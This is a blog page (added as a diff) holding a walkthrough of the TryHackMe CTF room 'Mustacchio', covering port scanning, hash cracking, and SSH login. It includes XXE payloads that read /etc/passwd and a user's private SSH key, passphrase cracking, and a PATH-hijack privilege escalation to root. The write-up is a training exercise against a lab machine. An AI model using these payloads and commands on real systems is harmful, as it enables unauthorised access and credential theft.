@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+    <!-- Document Settings -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <!-- Base Meta -->
+    <!-- dynamically fixing the title for tag/author pages -->
+
+
+
+    <title>Mustacchio Write Up</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- Styles'n'Scripts -->
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
+    <!-- highlight.js -->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+    <style>.hljs { background: none; }</style>
+
+    <!--[if IE]>
+        <style>
+            p, ol, ul{
+                width: 100%;
+            }
+            blockquote{
+                width: 100%;
+            }
+        </style>
+    <![endif]-->
+    
+    <!-- This tag outputs SEO meta+structured data and other important settings -->
+    <meta name="description" content="Infosec | Hacking | CTF" />
+    <link rel="shortcut icon" href="https://darrynbrownfield.co.uk/assets/images/favicon.png" type="image/png" />
+    <link rel="canonical" href="https://darrynbrownfield.co.uk/mustacchio" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+
+     <!--title below is coming from _includes/dynamic_title-->
+    <meta property="og:site_name" content="Darryn Brownfield" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Mustacchio Write Up" />
+    <meta property="og:description" content="Overview mustacchio is a easy rated CTF room on TryHackMe created by zyeinn. Nmap Although not required I added the machine IP to my host file so through out the write up I can use mustacchio.thm for consistency. Once added I started a nmap scan to check for available ports." />
+    <meta property="og:url" content="https://darrynbrownfield.co.uk/mustacchio" />
+    <meta property="og:image" content="https://darrynbrownfield.co.uk/assets/images/mustacchio/cover.png" />
+    <meta property="article:publisher" content="https://www.facebook.com/" />
+    <meta property="article:author" content="https://www.facebook.com/" />
+    <meta property="article:published_time" content="2021-08-12T00:00:00+00:00" />
+    <meta property="article:modified_time" content="2021-08-12T00:00:00+00:00" />
+    <meta property="article:tag" content="Tryhackme" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Mustacchio Write Up" />
+    <meta name="twitter:description" content="Overview mustacchio is a easy rated CTF room on TryHackMe created by zyeinn. Nmap Although not required I added the machine IP to my host file so through out the write up I can use mustacchio.thm for consistency. Once added I started a nmap scan to check for available ports." />
+    <meta name="twitter:url" content="https://darrynbrownfield.co.uk/" />
+    <meta name="twitter:image" content="https://darrynbrownfield.co.uk/assets/images/mustacchio/cover.png" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Darryn Brownfield" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="Tryhackme" />
+    <meta name="twitter:site" content="@dazbrownfield" />
+    <meta name="twitter:creator" content="@dazbrownfield" />
+    <meta property="og:image:width" content="1400" />
+    <meta property="og:image:height" content="933" />
+
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Website",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Darryn Brownfield",
+        "logo": "https://darrynbrownfield.co.uk/assets/images/blog-icon.png"
+    },
+    "url": "https://darrynbrownfield.co.uk/mustacchio",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://darrynbrownfield.co.uk/assets/images/mustacchio/cover.png",
+        "width": 2000,
+        "height": 666
+    },
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://darrynbrownfield.co.uk/mustacchio"
+    },
+    "description": "Overview mustacchio is a easy rated CTF room on TryHackMe created by zyeinn. Nmap Although not required I added the machine IP to my host file so through out the write up I can use mustacchio.thm for consistency. Once added I started a nmap scan to check for available ports."
+}
+    </script>
+
+    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
+    <script type="text/javascript">
+    ghost.init({
+    	clientId: "ghost-frontend",
+    	clientSecret: "f84a07a72b17"
+    });
+    </script> -->
+
+    <meta name="generator" content="Jekyll 3.6.2" />
+    <link rel="alternate" type="application/rss+xml" title="Mustacchio Write Up" href="/feed.xml" />
+
+
+</head>
+<body class="post-template">
+
+    <div class="site-wrapper">
+        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
+        <!-- default -->
+
+<!-- The tag above means: insert everything in this file
+into the {body} of the default.hbs template -->
+
+<header class="site-header outer">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left">
+        
+            
+
+            
+        
+        
+            <ul class="nav" role="menu">
+    <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
+    <li class="nav-about" role="menuitem"><a href="/about/">About</a></li>
+    <li class="nav-getting-started" role="menuitem"><a href="/tag/ctf/">CTF</a></li>
+</ul>
+
+        
+    </div>
+    <div class="site-nav-right">
+        <div class="social-links">
+            
+            <a
+              class="social-link social-link-tw"
+              href="https://github.com/darrynb89"
+              target="_blank"
+              rel="noopener"
+              ><svg
+  version="1.0"
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 120.000000 120.000000"
+>
+  <g
+    transform="translate(0.000000,120.000000) scale(0.0900000,-0.0900000)"
+    fill="#ffffff"
+    stroke="none"
+  >
+    <path
+      d="M441 1174 c-105 -28 -181 -73 -266 -159 -125 -124 -175 -246 -175
+-425 0 -179 50 -300 175 -425 85 -85 185 -145 243 -145 36 0 42 13 42 89 l0
+57 -57 -3 c-74 -5 -117 17 -150 78 -13 24 -37 56 -54 71 -34 33 -36 38 -9 38
+12 0 20 -7 20 -16 0 -10 6 -14 14 -11 10 4 13 1 9 -9 -3 -10 2 -14 18 -14 18
+0 20 -3 10 -9 -16 -11 -4 -34 14 -27 9 3 11 -2 7 -16 -4 -18 -2 -20 21 -14 20
+5 25 3 21 -8 -9 -23 17 -31 33 -11 12 17 13 17 13 2 0 -11 8 -17 21 -17 15 0
+19 5 15 15 -3 8 -1 15 4 15 6 0 10 -7 10 -15 0 -8 7 -15 15 -15 8 0 15 8 15
+18 0 10 10 39 23 64 l23 46 -59 13 c-136 28 -210 123 -211 268 -1 66 3 82 27
+124 23 39 27 55 22 86 -7 40 9 121 24 121 18 0 78 -25 113 -46 30 -19 42 -22
+70 -14 18 6 71 10 118 10 47 0 100 -4 118 -10 28 -8 40 -5 70 14 35 21 95 46
+113 46 15 0 31 -81 24 -121 -5 -31 -1 -47 22 -86 24 -42 28 -58 27 -123 -1
+-147 -65 -231 -203 -266 l-68 -18 18 -30 c15 -25 19 -51 19 -138 0 -58 3 -113
+6 -122 20 -52 166 16 279 129 125 125 175 246 175 425 0 179 -50 301 -175 425
+-86 87 -161 131 -270 160 -75 19 -241 19 -314 -1z"
+    />
+  </g>
+</svg></a
+            >
+            
+            <a
+              class="social-link social-link-li"
+              href="https://www.linkedin.com/in/darryn-brownfield-0b1132b5"
+              target="_blank"
+              rel="noopener"
+              ><svg viewBox="0 50 512 512">
+    <g transform="translate(0.000000,20.000000) scale(1.1)">
+      <path
+        d="M150.65,100.682c0,27.992-22.508,50.683-50.273,50.683c-27.765,0-50.273-22.691-50.273-50.683
+      C50.104,72.691,72.612,50,100.377,50C128.143,50,150.65,72.691,150.65,100.682z M143.294,187.333H58.277V462h85.017V187.333z
+      M279.195,187.333h-81.541V462h81.541c0,0,0-101.877,0-144.181c0-38.624,17.779-61.615,51.807-61.615
+      c31.268,0,46.289,22.071,46.289,61.615c0,39.545,0,144.181,0,144.181h84.605c0,0,0-100.344,0-173.915
+      s-41.689-109.131-99.934-109.131s-82.768,45.369-82.768,45.369V187.333z"
+      />
+    </g>
+  </svg></a
+            >
+             
+            <a
+              class="social-link social-link-tw"
+              href="https://twitter.com/dazbrownfield"
+              target="_blank"
+              rel="noopener"
+              ><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+</a
+            >
+             
+          </div>
+</nav>
+
+    </div>
+</header>
+
+<!-- Everything inside the #post tags pulls data from the post -->
+<!-- #post -->
+
+<main id="site-main" class="site-main outer" role="main">
+    <div class="inner">
+
+        <article class="post-full  tag-tryhackme tag-ctf tag-easy post ">
+
+            <header class="post-full-header">
+                <section class="post-full-meta">
+                    <time class="post-full-meta-date" datetime="12 August 2021">12 August 2021</time>
+                    
+                        <span class="date-divider">/</span>
+                        
+                            
+                               <a href='/tag/tryhackme/'>TRYHACKME</a>,
+                            
+                        
+                            
+                               <a href='/tag/ctf/'>CTF</a>,
+                            
+                        
+                            
+                               <a href='/tag/easy/'>EASY</a>
+                            
+                        
+                    
+                </section>
+                <h1 class="post-full-title">Mustacchio Write Up</h1>
+            </header>
+
+            <section class="post-full-content">
+                <div class="kg-card-markdown">
+                    <p><img src="/assets/images/mustacchio/cover.png" alt="cover" /></p>
+
+<h3 id="overview">Overview</h3>
+
+<p><a href="https://tryhackme.com/room/mustacchio">mustacchio</a> is a easy rated CTF room on <a href="https://tryhackme.com">TryHackMe</a> created by <a href="https://tryhackme.com/p/zyeinn">zyeinn</a>.</p>
+
+<h3 id="nmap">Nmap</h3>
+
+<p>Although not required I added the machine IP to my host file so through out the write up I can use mustacchio.thm for consistency. Once added I started a nmap scan to check for available ports.</p>
+
+<pre><code class="language-highlight">└──╼ $sudo nmap -sC -sV -oA nmap/initial mustacchio.thm
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-12 11:04 BST
+Nmap scan report for mustacchio.thm (10.10.41.138)
+Host is up (0.031s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
+|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
+|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Mustacchio | Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.60 seconds
+</code></pre>
+
+<p>2 Ports open:</p>
+
+<ul>
+  <li>22 - SSH - OpenSSH 7.2p2</li>
+  <li>80 - HTTP - Apache 2.4.18</li>
+</ul>
+
+<p>I also ran a full port scan and found 1 additional port:</p>
+
+<pre><code class="language-highlight">└──╼ $nmap -p- -oA nmap/full mustacchio.thm
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-12 11:07 BST
+Nmap scan report for mustacchio.thm (10.10.41.138)
+Host is up (0.032s latency).
+Not shown: 65532 filtered ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8765/tcp open  ultraseek-http
+
+Nmap done: 1 IP address (1 host up) scanned in 119.61 seconds
+</code></pre>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>I started with port 80 and was presented with a very basic web page, there isnt really any functionally on the pages.</p>
+
+<p><img src="/assets/images/mustacchio/index.png" alt="index" /></p>
+
+<p>I ran a gobuster to check for other directories.</p>
+
+<pre><code class="language-highlight">└──╼ $gobuster dir -u http://mustacchio.thm -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -t 75
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://mustacchio.thm
+[+] Threads:        75
+[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/08/12 11:11:22 Starting gobuster
+===============================================================
+/images (Status: 301)
+/fonts (Status: 301)
+/custom (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2021/08/12 11:11:34 Finished
+===============================================================
+</code></pre>
+
+<p>/custom could be interesting.</p>
+
+<p><img src="/assets/images/mustacchio/custom.png" alt="custom" /></p>
+
+<p>Looking in the js folder I found a file called users.bak, I downloaded the file to my machine.</p>
+
+<p><img src="/assets/images/mustacchio/usersbak.png" alt="usersbak" /></p>
+
+<p>Its a SQLite database.</p>
+
+<pre><code class="language-highlight">└──╼ $file users.bak 
+users.bak: SQLite 3.x database, last written using SQLite version 3034001
+</code></pre>
+
+<p>The database has one table called users with one record which is the username ‘admin’ and a hashed password which ive redacted from the output.</p>
+
+<pre><code class="language-highlight">└──╼ $sqlite3 users.bak
+SQLite version 3.31.1 2020-01-27 19:55:54
+Enter ".help" for usage hints.
+sqlite&gt; .tables
+users
+sqlite&gt; select * from users;
+admin|&lt;REDACTED&gt;
+sqlite&gt; 
+</code></pre>
+
+<p>The hash is SHA1, a great tool to use to identify hashes is hash-identifier.</p>
+
+<pre><code class="language-highlight">└──╼ $hash-identifier                                                       
+   #########################################################################
+   #     __  __                     __           ______    _____           #
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+ HASH: &lt;REDACTED&gt;
+
+Possible Hashs:
+[+] SHA-1
+[+] MySQL5 - SHA-1(SHA-1($pass))
+</code></pre>
+
+<p>I put the hash in a file called ‘hash’ and then used hashcat to crack it with the command <code class="highlighter-rouge">hashcat -m 100 hash /usr/share/wordlists/rockyou.txt --force</code>.</p>
+
+<p>The hash cracked within a few seconds, I looked around the webpage to find somewhere I could use the credentials but couldn’t find anything.</p>
+
+<p>I turned my attention to the other port 8765 and got an admin panel.</p>
+
+<p><img src="/assets/images/mustacchio/login.png" alt="login" /></p>
+
+<p>I logged in with the credentials and was presented with a page to add a comment.</p>
+
+<p><img src="/assets/images/mustacchio/comment.png" alt="comment" /></p>
+
+<p>Looking at the source code, 3 things jumped out.</p>
+
+<p><img src="/assets/images/mustacchio/source.png" alt="source" /></p>
+
+<p>1) Another backup file is referenced</p>
+
+<p>2) A username of Barry and a breadcumb to grab an SSH key if possible</p>
+
+<p>3) A reference to XML being used</p>
+
+<p>Clicking submit without any input presents an alert ‘Insert XML Code!’.</p>
+
+<p><img src="/assets/images/mustacchio/insertcode.png" alt="insertcode" /></p>
+
+<p>I downloaded the dontforget.bak file by browsing to: http://mustacchio.thm:8765/auth/dontforget.bak</p>
+
+<p>Looking at the file its an XML example.</p>
+
+<pre><code class="language-highlight">└──╼ $cat dontforget.bak 
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;comment&gt;
+  &lt;name&gt;Joe Hamd&lt;/name&gt;
+  &lt;author&gt;Barry Clad&lt;/author&gt;
+  &lt;com&gt;his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessl
+y and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now sin
+ce this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playin
+g with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that
+ you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.&lt;/com&gt;
+&lt;/comment&gt;
+</code></pre>
+<p>I tried the example on the webpage and got the expected result.</p>
+
+<p><img src="/assets/images/mustacchio/test.png" alt="test" /></p>
+
+<h3 id="initial-access">Initial Access</h3>
+
+<p>It appears the next step is to use XML External Entiry (XXE) to grab barry’s SSH key to allow us to connect to the machine. Learning XXE is very much on my to do list so I went over to <a href="https://portswigger.net/web-security/xxe">port swigger academy</a> which has a great training resource and found the following payload:</p>
+
+<pre><code class="language-highlight">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;
+</code></pre>
+
+<p>Using the original example and the payload above I created my own payload to test XXE.</p>
+
+<pre><code class="language-highlight">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
+&lt;comment&gt;
+  &lt;name&gt;Daz&lt;/name&gt;
+  &lt;author&gt;Please work...&lt;/author&gt;
+  &lt;com&gt;&amp;xxe;&lt;/com&gt;
+&lt;/comment&gt;
+</code></pre>
+
+<p>It worked!</p>
+
+<p><img src="/assets/images/mustacchio/testworked.png" alt="testworked" /></p>
+
+<p>I tweaked the payload to grab barrys SSH key.</p>
+
+<pre><code class="language-highlight">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"&gt; ]&gt;
+&lt;comment&gt;
+  &lt;name&gt;Daz&lt;/name&gt;
+  &lt;author&gt;Please work...&lt;/author&gt;
+  &lt;com&gt;&amp;xxe;&lt;/com&gt;
+&lt;/comment&gt;
+</code></pre>
+
+<p>Again this worked, however looking at the key it is encrypted so before I can use it to login I need to crack it.</p>
+
+<pre><code class="language-highlight">  GNU nano 4.9.2                                       
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E
+&lt;redacted&gt;
+</code></pre>
+
+<p>I used ssh2john to generate a hash and saved it to a file called keyhash.</p>
+
+<pre><code class="language-highlight">└──╼ $/usr/share/john/ssh2john.py key &gt; keyhash
+</code></pre>
+
+<p>Then using john and the rockyou wordlist I was able to get the keys password.</p>
+
+<pre><code class="language-highlight">└──╼ $john keyhash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+&lt;redacted&gt;       (key)
+1g 0:00:00:05 DONE (2021-08-12 11:30) 0.1779g/s 2551Kp/s 2551Kc/s 2551KC/sa6_123..*7¡Vamos!
+Session completed
+</code></pre>
+
+<p>To use the key I used chmod 600 and was able to login.</p>
+
+<pre><code class="language-highlight">└──╼ $chmod 600 key
+┌─[daz@parrot]─[~/Documents/TryHackMe/Mustacchio]
+└──╼ $ssh -i key barry@mustacchio.thm
+Enter passphrase for key 'key': 
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+34 packages can be updated.
+16 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+
+Last login: Thu Aug 12 10:31:58 2021 from 10.8.21.217
+barry@mustacchio:~$ 
+</code></pre>
+
+<h3 id="priv-esc">Priv Esc</h3>
+
+<p>While enumerating the machine I found another user directory. Within this directory was a ELF file owned by root but executable by all.</p>
+
+<pre><code class="language-highlight">barry@mustacchio:~$ cd /home/joe/
+barry@mustacchio:/home/joe$ ls
+live_log
+barry@mustacchio:/home/joe$ file live_log 
+live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a455189
+64ad12abe, for GNU/Linux 3.2.0, not stripped
+barry@mustacchio:/home/joe$ ls -lah live_log 
+-rwsr-xr-x 1 root root 17K Jun 12 15:48 live_log
+barry@mustacchio:/home/joe$ 
+</code></pre>
+
+<p>Running the file it appears to just be reading the HTTP access logs for port 8765.</p>
+
+<pre><code class="language-highlight">barry@mustacchio:/home/joe$ ./live_log 
+10.8.21.217 - - [12/Aug/2021:10:20:02 +0000] "GET /home.php HTTP/1.1" 200 1077 "-" "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"
+10.8.21.217 - - [12/Aug/2021:10:20:27 +0000] "POST /home.php HTTP/1.1" 200 1077 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
+x/68.0"
+10.8.21.217 - - [12/Aug/2021:10:21:00 +0000] "POST /home.php HTTP/1.1" 200 1123 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
+x/68.0"
+10.8.21.217 - - [12/Aug/2021:10:23:47 +0000] "GET /auth/dontforget.bak HTTP/1.1" 200 996 "-" "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"
+10.8.21.217 - - [12/Aug/2021:10:25:24 +0000] "POST /home.php HTTP/1.1" 200 1123 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
+x/68.0"
+10.8.21.217 - - [12/Aug/2021:10:25:25 +0000] "POST /home.php HTTP/1.1" 200 1563 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
+x/68.0"
+10.8.21.217 - - [12/Aug/2021:10:26:37 +0000] "GET /home.php HTTP/1.1" 200 1077 "-" "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"
+10.8.21.217 - - [12/Aug/2021:10:27:01 +0000] "POST /home.php HTTP/1.1" 200 1782 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
+x/68.0"
+10.8.21.217 - - [12/Aug/2021:10:27:39 +0000] "GET /home.php HTTP/1.1" 200 1077 "-" "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"
+10.8.21.217 - - [12/Aug/2021:10:28:20 +0000] "POST /home.php HTTP/1.1" 200 2573 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
+x/68.0"
+^CLive Nginx Log Readerbarry@mustacchio:/home/joe$ 
+</code></pre>
+
+<p>I used strings to look at the file and found the line:</p>
+
+<p>tail -f /var/log/nginx/access.log</p>
+
+<p>Because the tail command is not using an absolute path, we should be able to get privilege escalation by using the PATH variable. Raj Chandel has a great <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">blog</a> about this technique.</p>
+
+<pre><code class="language-highlight">barry@mustacchio:/home/joe$ 
+barry@mustacchio:/home/joe$ cd /tmp
+barry@mustacchio:/tmp$ echo "/bin/bash" &gt; tail
+barry@mustacchio:/tmp$ chmod +x tail 
+barry@mustacchio:/tmp$ export PATH=/tmp:$PATH
+barry@mustacchio:/tmp$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+barry@mustacchio:/tmp$ /home/joe/live_log 
+root@mustacchio:/tmp# whoami
+root
+root@mustacchio:/tmp# 
+</code></pre>
+
+<p>Thanks for reading!</p>
+
+
+                </div>
+            </section>
+
+            <!-- Email subscribe form at the bottom of the page -->
+            
+
+            <footer class="post-full-footer">
+                <!-- Everything inside the #author tags pulls data from the author -->
+            </footer>
+
+            <!-- If you use Disqus comments, just uncomment this block.
+            The only thing you need to change is "test-apkdzgmqhj" - which
+            should be replaced with your own Disqus site-id. -->
+            
+
+        </article>
+
+    </div>
+</main>
+
+
+
+        <!-- Previous/next page links - displayed on every page -->
+        
+
+        <!-- The footer at the very bottom of the screen -->
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="https://darrynbrownfield.co.uk/">Darryn Brownfield</a> &copy; 2021</section>
+                <nav class="site-footer-nav">
+                    <a href="/">Latest Posts</a>
+                 </nav>
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- The big email subscribe modal content -->
+    
+
+    <!-- highlight.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
+    <script>$(document).ready(function() {
+      $('pre code').each(function(i, block) {
+        hljs.highlightBlock(block);
+      });
+    });</script>
+
+    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
+    <script
+        src="https://code.jquery.com/jquery-3.2.1.min.js"
+        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+        crossorigin="anonymous">
+    </script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>
+
+
+    <!-- Paginator increased to "infinit" in _config.yml -->
+    <!-- if paginator.posts  -->
+    <!-- <script>
+        var maxPages = parseInt('');
+    </script>
+    <script src="/assets/js/infinitescroll.js"></script> -->
+    <!-- /endif -->
+
+    
+
+
+    <!-- Add Google Analytics  -->
+    <!-- Google Analytics Tracking code -->
+ <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-175458891-1', 'auto');
+  ga('send', 'pageview');
+
+ </script>
+
+
+    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
+    
+        <script>
+
+// NOTE: Scroll performance is poor in Safari
+// - this appears to be due to the events firing much more slowly in Safari.
+//   Dropping the scroll event and using only a raf loop results in smoother
+//   scrolling but continuous processing even when not scrolling
+$(document).ready(function () {
+    // Start fitVids
+    var $postContent = $(".post-full-content");
+    $postContent.fitVids();
+    // End fitVids
+
+    var progressBar = document.querySelector('progress');
+    var header = document.querySelector('.floating-header');
+    var title = document.querySelector('.post-full-title');
+
+    var lastScrollY = window.scrollY;
+    var lastWindowHeight = window.innerHeight;
+    var lastDocumentHeight = $(document).height();
+    var ticking = false;
+
+    function onScroll() {
+        lastScrollY = window.scrollY;
+        requestTick();
+    }
+
+    function onResize() {
+        lastWindowHeight = window.innerHeight;
+        lastDocumentHeight = $(document).height();
+        requestTick();
+    }
+
+    function requestTick() {
+        if (!ticking) {
+            requestAnimationFrame(update);
+        }
+        ticking = true;
+    }
+
+    function update() {
+        var trigger = title.getBoundingClientRect().top + window.scrollY;
+        var triggerOffset = title.offsetHeight + 35;
+        var progressMax = lastDocumentHeight - lastWindowHeight;
+
+        // show/hide floating header
+        if (lastScrollY >= trigger + triggerOffset) {
+            header.classList.add('floating-active');
+        } else {
+            header.classList.remove('floating-active');
+        }
+
+        progressBar.setAttribute('max', progressMax);
+        progressBar.setAttribute('value', lastScrollY);
+
+        ticking = false;
+    }
+
+    window.addEventListener('scroll', onScroll, {passive: true});
+    window.addEventListener('resize', onResize, false);
+
+    update();
+});
+</script>
+
+    
+
+    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
+    <!-- ghost_foot -->
+
+</body>
+</html>
